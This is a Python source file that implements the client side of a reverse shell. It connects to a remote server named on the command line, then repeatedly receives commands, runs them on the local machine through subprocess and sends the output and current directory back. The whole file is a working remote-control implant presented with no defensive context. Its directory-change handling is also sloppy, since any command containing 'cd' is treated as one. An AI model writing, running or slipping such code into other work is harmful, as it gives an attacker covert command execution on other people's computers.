import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
# SERVER_HOST = "1.1.1.1"
SERVER_PORT = 5005
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "###"

# create the socket object
with socket.socket() as s:
    # connect to the serveras
    s.connect((SERVER_HOST, SERVER_PORT))

    # get the current directory 
    cwd = os.getcwd()
    # send to server
    s.send(cwd.encode())

    # in the loop, receive the command from server, execute it and send the result back to server
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        # if the command is exit, just break out of the loop
        if command == "exit":
            break
        # change directory
        if "cd" in command:
            try:
                os.chdir(command[2:])
            # if there is an error, set as the output
            except FileNotFoundError as e:
                output = str(e)
            else:
            # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)

        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())

